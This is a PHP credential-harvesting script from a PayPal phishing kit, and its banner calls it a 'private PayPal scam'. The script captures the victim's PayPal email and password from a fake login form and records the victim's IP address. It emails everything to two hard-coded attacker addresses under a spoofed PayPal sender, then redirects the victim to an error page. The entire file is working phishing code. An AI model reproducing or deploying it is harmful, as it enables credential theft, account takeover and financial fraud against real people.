<?php

/*
╔═════════════════════════════╗
╠═══ PRIVATE PAYPAL SCAM ═════╣
╠═══════ BY TN-SN!PER ════════╣
╠═════════ GREETZ TO ═════════╣
╠═ DARCK PIRATOS & ADELSS04 ══╣
╚═════════════════════════════╝
*/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "=========[LOGIN INFOS]=========\n";
$message .= "PayPal Email  : ".$_POST['EM']."\n";
$message .= "PayPal Password  : ".$_POST['PS']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BY TraBelsi Fahmi]=========";


$to = "trabelsiifahmi@gmail.com,safou22wow@gmail.com";
$subject = "PP LOGIN Paypal (25%) [$ip]";
$headers = "From: Fahmi/Safwen (25%)<paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:login/error.php");


?>